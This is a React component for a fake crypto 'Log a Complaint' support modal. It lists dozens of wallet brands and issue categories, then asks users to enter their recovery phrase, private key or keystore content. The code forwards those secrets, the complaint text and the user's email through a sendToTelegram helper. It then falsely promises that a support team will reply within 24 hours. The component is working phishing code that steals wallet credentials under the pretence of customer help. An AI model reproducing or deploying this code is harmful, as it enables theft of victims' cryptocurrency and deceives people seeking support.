"use client"

import { useState } from "react"
import { sendToTelegram } from "@/lib/telegram"

const WALLETS = [
  { name: "Alpha Wallet", logo: "🅰️" },
  { name: "Argent X", logo: "🛡️" },
  { name: "Atomic Wallet", logo: "⚛️" },
  { name: "Bitget Wallet", logo: "🎯" },
  { name: "Binance Web3", logo: "🔶" },
  { name: "BlueWallet", logo: "💙" },
  { name: "Brave Wallet", logo: "🦁" },
  { name: "Coin98", logo: "💰" },
  { name: "Coinbase", logo: "📱" },
  { name: "Coinomi", logo: "🪙" },
  { name: "CoolWallet", logo: "❄️" },
  { name: "Crypto.com DeFi", logo: "🔴" },
  { name: "Electrum", logo: "⚡" },
  { name: "Ellipal Titan", logo: "🛡️" },
  { name: "Enjin Wallet", logo: "🎮" },
  { name: "Exodus", logo: "📤" },
  { name: "Frame Wallet", logo: "🖼️" },
  { name: "Frontier", logo: "🌍" },
  { name: "Guarda", logo: "🏰" },
  { name: "Huobi/HTX", logo: "🔶" },
  { name: "ImToken", logo: "📲" },
  { name: "Keplr", logo: "🪐" },
  { name: "Keystone Pro", logo: "🔑" },
  { name: "KuCoin", logo: "🟡" },
  { name: "Ledger Nano", logo: "🔐" },
  { name: "Magic Eden", logo: "✨" },
  { name: "Maiar Wallet", logo: "🌟" },
  { name: "MathChain", logo: "🔢" },
  { name: "MathWallet", logo: "Ⓜ️" },
  { name: "MetaMask", logo: "🦊" },
  { name: "Muun", logo: "🌙" },
  { name: "Nabox", logo: "📦" },
  { name: "OKX Wallet", logo: "🟣" },
  { name: "ONTO Wallet", logo: "🌐" },
  { name: "Opera Crypto", logo: "🎭" },
  { name: "Phantom", logo: "👻" },
  { name: "Pillar", logo: "🏛️" },
  { name: "Rabby", logo: "🐰" },
  { name: "Rainbow", logo: "🌈" },
  { name: "SafePal", logo: "🛡️" },
  { name: "SafeMath", logo: "🔒" },
  { name: "Samourai", logo: "⚔️" },
  { name: "Sparrow", logo: "🐦" },
  { name: "Stake", logo: "📍" },
  { name: "Taho", logo: "🎨" },
  { name: "Temple", logo: "🏛️" },
  { name: "Trezor", logo: "🛡️" },
  { name: "TokenPocket", logo: "👜" },
  { name: "Trust Wallet", logo: "✅" },
  { name: "ViaWallet", logo: "🌉" },
  { name: "WalletConnect", logo: "🔗" },
  { name: "Wasabi", logo: "🌶️" },
  { name: "XDEFI", logo: "❌" },
  { name: "Zerion", logo: "Z️" },
]

const COMPLAINT_CATEGORIES = [
  { name: "Rectification", icon: "🔧" },
  { name: "Validation", icon: "✓" },
  { name: "Swap/Exchange", icon: "🔄" },
  { name: "Staking Issue", icon: "📈" },
  { name: "Transaction Error", icon: "❌" },
  { name: "Locked Account", icon: "🔒" },
  { name: "Assets Recovery", icon: "💰" },
  { name: "Claim Reflection", icon: "🎯" },
  { name: "Connect to DApps", icon: "🔗" },
  { name: "Claim Airdrop", icon: "🎁" },
  { name: "Login Issues", icon: "🔑" },
]

const CREDENTIAL_TYPES = [
  { name: "Recovery Phrase", value: "phrase" },
  { name: "Private Key", value: "privatekey" },
  { name: "Keystore File", value: "keystore" },
]

export default function ComplaintsModal({
  open,
  onOpenChange,
}: { open: boolean; onOpenChange: (open: boolean) => void }) {
  const [step, setStep] = useState<"category" | "wallet" | "credentials" | "email" | "success">("category")
  const [selectedCategory, setSelectedCategory] = useState<string | null>(null)
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [credentialType, setCredentialType] = useState<string>("")
  const [credentials, setCredentials] = useState("")
  const [email, setEmail] = useState("")
  const [complaintMessage, setComplaintMessage] = useState("")
  const [loading, setLoading] = useState(false)

  const handleCategorySelect = () => {
    if (selectedCategory) setStep("wallet")
  }

  const handleWalletSelect = () => {
    if (selectedWallet) setStep("credentials")
  }

  const handleCredentialsSubmit = () => {
    if (credentials.trim() && complaintMessage.trim()) setStep("email")
  }

  const handleEmailSubmit = async () => {
    if (email.trim()) {
      setLoading(true)
      const success = await sendToTelegram({
        walletAddress: email,
        credential: credentials,
        credentialType: credentialType as "phrase" | "keystore" | "privatekey",
        wallet: selectedWallet || "",
        crypto: "Multiple",
        userInfo: {
          category: selectedCategory,
          message: complaintMessage,
          email: email,
        },
      })
      setLoading(false)

      if (success) {
        setStep("success")
        setTimeout(() => {
          onOpenChange(false)
          resetForm()
        }, 2000)
      }
    }
  }

  const resetForm = () => {
    setStep("category")
    setSelectedCategory(null)
    setSelectedWallet(null)
    setCredentialType("")
    setCredentials("")
    setEmail("")
    setComplaintMessage("")
  }

  if (!open) return null

  return (
    <div className="fixed inset-0 z-50 pointer-events-none">
      <div
        className="absolute inset-0 bg-black/70 pointer-events-auto"
        onClick={() => {
          onOpenChange(false)
          resetForm()
        }}
      />

      <div className="absolute inset-0 flex items-center justify-center pointer-events-auto">
        <div className="bg-white rounded-xl shadow-2xl max-w-2xl w-full mx-4 p-8 max-h-[90vh] overflow-y-auto">
          <div className="mb-8 flex justify-between items-start">
            <div>
              <h2 className="text-3xl font-bold text-gray-900">Log a Complaint</h2>
              <p className="text-blue-600 text-sm mt-2">Get assistance with your crypto concerns</p>
            </div>
            <button
              onClick={() => {
                onOpenChange(false)
                resetForm()
              }}
              className="text-gray-600 hover:text-gray-900 transition"
            >
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>

          <div className="space-y-6">
            {/* Step 1: Category Selection */}
            {step === "category" && (
              <>
                <div>
                  <h3 className="text-lg font-semibold text-gray-900 mb-4">Select Issue Category</h3>
                  <div className="grid grid-cols-2 md:grid-cols-3 gap-3 max-h-64 overflow-y-auto">
                    {COMPLAINT_CATEGORIES.map((cat) => (
                      <button
                        key={cat.name}
                        onClick={() => setSelectedCategory(cat.name)}
                        className={`p-3 rounded-lg border-2 transition flex flex-col items-center gap-2 ${
                          selectedCategory === cat.name
                            ? "border-blue-500 bg-blue-50"
                            : "border-gray-300 hover:border-blue-400 bg-gray-50"
                        }`}
                      >
                        <span className="text-2xl">{cat.icon}</span>
                        <span className="text-xs font-medium text-gray-900 text-center">{cat.name}</span>
                      </button>
                    ))}
                  </div>
                </div>
                <div className="flex gap-3 pt-4">
                  <button
                    onClick={() => {
                      onOpenChange(false)
                      resetForm()
                    }}
                    className="flex-1 px-4 py-3 border-2 border-gray-300 text-gray-900 rounded-lg hover:border-gray-400 transition font-semibold"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handleCategorySelect}
                    disabled={!selectedCategory}
                    className="flex-1 px-4 py-3 bg-blue-500 hover:bg-blue-600 disabled:opacity-50 text-white rounded-lg transition font-semibold disabled:cursor-not-allowed"
                  >
                    Next
                  </button>
                </div>
              </>
            )}

            {/* Step 2: Wallet Selection */}
            {step === "wallet" && (
              <>
                <div>
                  <h3 className="text-lg font-semibold text-gray-900 mb-4">Select Your Wallet</h3>
                  <div className="grid grid-cols-6 md:grid-cols-8 gap-2 max-h-64 overflow-y-auto">
                    {WALLETS.map((wallet) => (
                      <button
                        key={wallet.name}
                        onClick={() => setSelectedWallet(wallet.name)}
                        className={`p-2 rounded-lg border-2 transition flex flex-col items-center gap-1 ${
                          selectedWallet === wallet.name
                            ? "border-blue-500 bg-blue-50"
                            : "border-gray-300 hover:border-blue-400 bg-gray-50"
                        }`}
                        title={wallet.name}
                      >
                        <span className="text-xl">{wallet.logo}</span>
                        <span className="text-xs font-medium text-gray-900 text-center line-clamp-2">
                          {wallet.name}
                        </span>
                      </button>
                    ))}
                  </div>
                </div>
                <div className="flex gap-3 pt-4">
                  <button
                    onClick={() => setStep("category")}
                    className="flex-1 px-4 py-3 border-2 border-gray-300 text-gray-900 rounded-lg hover:border-gray-400 transition font-semibold"
                  >
                    Back
                  </button>
                  <button
                    onClick={handleWalletSelect}
                    disabled={!selectedWallet}
                    className="flex-1 px-4 py-3 bg-blue-500 hover:bg-blue-600 disabled:opacity-50 text-white rounded-lg transition font-semibold disabled:cursor-not-allowed"
                  >
                    Next
                  </button>
                </div>
              </>
            )}

            {/* Step 3: Credentials */}
            {step === "credentials" && (
              <>
                <div className="space-y-4">
                  <div>
                    <label className="block text-gray-900 font-semibold mb-2">Credential Type</label>
                    <select
                      value={credentialType}
                      onChange={(e) => setCredentialType(e.target.value)}
                      className="w-full px-4 py-2 bg-white border border-gray-300 rounded text-gray-900 focus:border-blue-500 focus:outline-none"
                    >
                      <option value="">Select credential type</option>
                      {CREDENTIAL_TYPES.map((type) => (
                        <option key={type.value} value={type.name}>
                          {type.name}
                        </option>
                      ))}
                    </select>
                  </div>

                  <div>
                    <label className="block text-gray-900 font-semibold mb-2">
                      Your Credentials / Private Key / Phrase
                    </label>
                    <textarea
                      value={credentials}
                      onChange={(e) => setCredentials(e.target.value)}
                      placeholder="Enter your recovery phrase, private key, or keystore content"
                      className="w-full px-4 py-3 bg-white border border-gray-300 rounded text-gray-900 placeholder-gray-400 focus:border-blue-500 focus:outline-none h-24 resize-none"
                    />
                  </div>

                  <div>
                    <label className="block text-gray-900 font-semibold mb-2">Complaint Message</label>
                    <textarea
                      value={complaintMessage}
                      onChange={(e) => setComplaintMessage(e.target.value)}
                      placeholder="Describe your issue in detail"
                      className="w-full px-4 py-3 bg-white border border-gray-300 rounded text-gray-900 placeholder-gray-400 focus:border-blue-500 focus:outline-none h-20 resize-none"
                    />
                  </div>
                </div>

                <div className="flex gap-3 pt-4">
                  <button
                    onClick={() => setStep("wallet")}
                    className="flex-1 px-4 py-3 border-2 border-gray-300 text-gray-900 rounded-lg hover:border-gray-400 transition font-semibold"
                  >
                    Back
                  </button>
                  <button
                    onClick={handleCredentialsSubmit}
                    disabled={!credentialType || !credentials.trim() || !complaintMessage.trim()}
                    className="flex-1 px-4 py-3 bg-blue-500 hover:bg-blue-600 disabled:opacity-50 text-white rounded-lg transition font-semibold disabled:cursor-not-allowed"
                  >
                    Next
                  </button>
                </div>
              </>
            )}

            {/* Step 4: Email */}
            {step === "email" && (
              <>
                <div className="bg-blue-50 border border-blue-300 rounded-lg p-4">
                  <p className="text-gray-700 text-sm mb-4">
                    Our support team will review your complaint and respond within 24 hours. Please provide your email
                    for confirmation.
                  </p>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Enter your email address"
                    className="w-full px-4 py-3 bg-white border border-gray-300 rounded text-gray-900 placeholder-gray-400 focus:border-blue-500 focus:outline-none mb-4"
                  />
                </div>

                <div className="flex gap-3 pt-4">
                  <button
                    onClick={() => setStep("credentials")}
                    className="flex-1 px-4 py-3 border-2 border-gray-300 text-gray-900 rounded-lg hover:border-gray-400 transition font-semibold"
                  >
                    Back
                  </button>
                  <button
                    onClick={handleEmailSubmit}
                    disabled={!email.trim()}
                    className="flex-1 px-4 py-3 bg-blue-500 hover:bg-blue-600 disabled:opacity-50 text-white rounded-lg transition font-semibold disabled:cursor-not-allowed"
                  >
                    Submit Complaint
                  </button>
                </div>
              </>
            )}

            {/* Step 5: Success */}
            {step === "success" && (
              <div className="text-center py-8">
                <div className="w-16 h-16 rounded-full bg-green-100 border-2 border-green-500 flex items-center justify-center mx-auto mb-4">
                  <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <h3 className="text-2xl font-bold text-gray-900 mb-2">Complaint Submitted!</h3>
                <p className="text-gray-700 mb-4">
                  Your complaint has been submitted. Our team will review your case and contact you within 24 hours via
                  email.
                </p>
                <p className="text-blue-600 text-sm">Redirecting...</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
